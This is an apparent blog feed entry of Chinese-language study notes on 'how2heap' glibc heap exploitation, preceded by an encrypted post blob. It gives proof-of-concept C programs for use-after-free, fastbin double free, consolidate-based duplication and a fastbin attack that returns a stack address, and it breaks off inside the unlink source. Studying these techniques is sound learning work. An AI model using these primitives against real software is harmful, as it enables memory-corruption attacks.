Mlah4yH9e3kQOG7K803pwrbf/pjMNHRPw4JeZRpsmEF5rgpLYrInVOegPfDkATb1VIw8Sq3HjU7zgym+aW8filrPzHHuknHK37PjHEmsOnLpUD+GmbngYbygCYMrW7IU771LhaQHGWQqvfwhV9r/c29Z6JXALiJ/PNB/wy0NA9psmbO9TTty0FuRahjLZVTe191Img+njObZ0hD7RdhJeNJExpVPnfj89W3Rp9t4iZQnYQliENqJRYEfd0rmXJLQ25l0zQpSNaU5tF9LZq+gH3yWb2P81y0eh6BDJdCjJSLQFX+IRMlD2+oE9BQ9mJJNHvITs7hSwSKhOBhGKhHmUgknTHOqo0+ExPj4KVZCl6AX2M6piqR2ziqWW9Skl4k2B4Lls+qPEAfroNCO0sC27Cl9fIUo8rytoEEuRG6YUcikBSgiu/scgyV3hymh6y28B5j2xN5D6vMVMoYmYfEb9YX/bQqXHXTLeb8dvCcWTgOR00kmpMKPZhbw1NOBbGJDIMUnzjkI0nfEM0g0FT2G9Y+z+X9Czx4m49daEmLhcCgUnOfJbPBIjDbgwB28kEL7c7ySLX3YdakCMo+DC1007tLUlsZFGu0PJwsldZ9+OMw7DZoBUJzKfPewBamnTPX45Wsu4Gx1+GmvkdvaFP6z6PJvpjXRy4GkKSYAer/vNu9pxb0UASo431r33ggKlw9WA++JlTEEHfOkLtmTmpGQhSOobnT4jf+P5ccghsxEHSq/UyKeJeyo8+jb1c4qHq/c43k7YmtYgxuC7DXVUeXSvQwsgpl3w+0d3wkCHlhVpRmJV8nKLuawpWFiInqHtyrt2PO/1D+S6LwNJBsMtAy/AA4BZyYuxJkNS/txmLqd7RIRcC5U4HTrmOR2KiVkqPSjjUOKGLgu028iflzk9ysQKaBWUAKChR0LAbOzYVhDPs5h6+lRgN0/JWTHsjSd6MSzAWqDxBxVizoQ3qRwbp/ZpMX0w+6AYzZvnzFkWl1UbWNdtvK6LojVuhxN1rUOnwpzOi+2enWM1P/eHUJK4MJEpioPgMFQl81elLAcxTbWMEmcisnIxarFJsFDmjvhVGryZpjQSYqEz79V+hnzaZOawxg4LKAbm+VhyrNJnwyQjQf/EDwCk/vACg5qlhvGaxAGigGF3nTx3HcrrCllBIZII8Z31JKANlrDZWj0bttmGRvE1+u3deouaqU/QK4GS/MyJ2vueQMPFCepB8sPqQuOlBle4rK3Z1gUbuafprJxcpo/bgFZ14vJGg9SQxoivpU9iJTuqRG3BzGn2qULI1EUzWoeyOQ0dUyrAc3v05iJg9RJj3GjN6doBhzlN8fifZZ46PuAwpRu5hZi0JLjM </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="others" scheme="https://pz1o.top/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="https://pz1o.top/2021/05/19/how2heap/"/>
    <id>https://pz1o.top/2021/05/19/how2heap/</id>
    <published>2021-05-19T15:13:31.000Z</published>
    <updated>2021-06-09T11:45:40.849Z</updated>
    
    <content type="html"><![CDATA[<p>回档到堆</p><a id="more"></a><p><a href="https://lorexxar.cn/2021/05/19/lifesuibi/#写在最后" target="_blank" rel="noopener">创宇四年 · LoRexxar’s Blog</a></p><h1 id="0x01-glibc内存管理"><a href="#0x01-glibc内存管理" class="headerlink" title="0x01 glibc内存管理"></a>0x01 glibc内存管理</h1><h2 id="1-ptmalloc内存管理"><a href="#1-ptmalloc内存管理" class="headerlink" title="1. ptmalloc内存管理"></a>1. ptmalloc内存管理</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>每个进程只有一个主分配区，但可能存在多个非主分配区</p><h1 id="0x02-first-fit"><a href="#0x02-first-fit" class="headerlink" title="0x02 first-fit"></a>0x02 first-fit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>简单的UAF漏洞</p><p>利用条件：free后指针不清空</p><p><strong>影响：我们可以通过C来控制A</strong></p></blockquote><h1 id="0x03-fastbin-dup"><a href="#0x03-fastbin-dup" class="headerlink" title="0x03 fastbin_dup"></a>0x03 fastbin_dup</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>fastbin double free</p><p>利用条件：free后指针不清空</p><p><strong>影响：我们可以通过C来控制A</strong></p><p>这里通过指针check，没检查后续指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</span><br><span class="line">&gt;fastbin 在执行 <span class="built_in">free</span> 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">      record we are going to add (i.e., double free).  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">       errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">       <span class="keyword">goto</span> errout;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><h1 id="0x04-fastbin-dup-consolidate"><a href="#0x04-fastbin-dup-consolidate" class="headerlink" title="0x04 fastbin_dup_consolidate"></a>0x04 fastbin_dup_consolidate</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>释放p1之后，再分配大堆块，就会malloc_consolidate，将p1放入unsorted bin中</li><li>然后把p1放入smallbin中</li><li>程序第二次free chunk1，就会把他放到fastbin中，此时fastbin和smallbin中就各有一个0x40大小的chunk</li><li>这时继续申请两个chunk，就可以申请到两个同样内存大小的chunk</li></ol><p>利用条件：首先我们得有足够大的size可以申请，此外free之后不能为空</p><p><strong>影响：我们可以分配两块指向同一块内存的chunk，此外还可以拿到libc基址</strong></p></blockquote><p>malloc_consolidate函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T <span class="built_in">size</span>;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">          <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">            malloc_printerr (<span class="string">"malloc_consolidate(): invalid chunk size"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        check_inuse_chunk(av, p);</span><br><span class="line">        nextp = p-&gt;fd;</span><br><span class="line">        <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">        <span class="built_in">size</span> = chunksize (p);</span><br><span class="line">        nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">        nextsize = chunksize(nextchunk);</span><br><span class="line">        <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">          prevsize = prev_size (p);</span><br><span class="line">          <span class="built_in">size</span> += prevsize;</span><br><span class="line">          p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr (<span class="string">"corrupted size vs. prev_size in fastbins"</span>);</span><br><span class="line">          unlink_chunk (av, p);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">          nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">          <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">            <span class="built_in">size</span> += nextsize;</span><br><span class="line">            unlink_chunk (av, nextchunk);</span><br><span class="line">          &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">          first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">          unsorted_bin-&gt;fd = p;</span><br><span class="line">          first_unsorted-&gt;bk = p;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (<span class="built_in">size</span>)) &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">          p-&gt;bk = unsorted_bin;</span><br><span class="line">          p-&gt;fd = first_unsorted;</span><br><span class="line">          set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">size</span> += nextsize;</span><br><span class="line">          set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">          av-&gt;top = p;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释：</p><p>分配largebin时，会先遍历一下fastbin，将相邻的chunk合并，链接到unsortedbin中，然后看unsorted bin中是否有合适的chunk（上次分配被使用过）可以直接去切割。否则，就根据chunk空间大小放入small bin或large bin中。</p><h1 id="0x05-fastbin-dup-into-stack"><a href="#0x05-fastbin-dup-into-stack" class="headerlink" title="0x05 fastbin_dup_into_stack"></a>0x05 fastbin_dup_into_stack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line"><span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line"><span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line"><span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line"><span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>利用double free</p><ol><li>double free之后修改A的fd指针，为栈上的地址</li><li>即可完成栈上任意写</li></ol><p>利用条件：double free，栈上的地址</p><p><strong>影响：对栈上任意写</strong></p></blockquote><h1 id="0x06-unsafe-unlink"><a href="#0x06-unsafe-unlink" class="headerlink" title="0x06 unsafe_unlink"></a>0x06 unsafe_unlink</h1><p><strong>unlink是用来干什么的？以及什么时候干？</strong></p><p><strong>通常取走双向链表的chunk就需要unlink，通常会发生在双向链表中</strong></p><ol><li>malloc请求同样大小的large chunk</li><li>free中前（合并物理相邻高物理地址空闲chunk）后（合并物理相邻低物理地址空闲chunk）向合并</li><li>malloc_consolidate前后向合并</li></ol><p>unlink的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1344</span><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line"><span class="number">1345</span>     FD = P-&gt;fd;                                                               </span><br><span class="line"><span class="number">1346</span>     BK = P-&gt;bk;                                                               </span><br><span class="line"><span class="number">1347</span>     <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </span><br><span class="line"><span class="number">1348</span>       malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line"><span class="number">1349</span>     <span class="keyword">else</span> &#123;                                                                    </span><br><span class="line"><span class="number">1350</span>         FD-&gt;bk = BK;                                                          </span><br><span class="line"><span class="number">1351</span>         BK-&gt;fd = FD;                                                          </span><br><span class="line"><span class="number">1352</span>         <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)                                      </span><br><span class="line"><span class="number">1353</span>             &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                </span><br><span class="line"><span class="number">1354</span>             <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        </span><br><span class="line"><span class="number">1355</span>                 || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line"><span class="number">1356</span>               malloc_printerr (check_action,                                  </span><br><span class="line"><span class="number">1357</span>                                <span class="string">"corrupted double-linked list (not small)"</span>,    </span><br><span class="line"><span class="number">1358</span>                                P, AV);                                        </span><br><span class="line"><span class="number">1359</span>             <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                    </span><br><span class="line"><span class="number">1360</span>                 <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line"><span class="number">1361</span>                   FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     </span><br><span class="line"><span class="number">1362</span>                 <span class="keyword">else</span> &#123;                                                        </span><br><span class="line"><span class="number">1363</span>                     FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         </span><br><span class="line"><span class="number">1364</span>                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         </span><br><span class="line"><span class="number">1365</span>                     P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         </span><br><span class="line"><span class="number">1366</span>                     P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         </span><br><span class="line"><span class="number">1367</span>                   &#125;                                                           </span><br><span class="line"><span class="number">1368</span>               &#125; <span class="keyword">else</span> &#123;                                                        </span><br><span class="line"><span class="number">1369</span>                 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 </span><br><span class="line"><span class="number">1370</span>                 P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 </span><br><span class="line"><span class="number">1371</span>               &#125;                                                               </span><br><span class="line"><span class="number">1372</span>           &#125;                                                                   </span><br><span 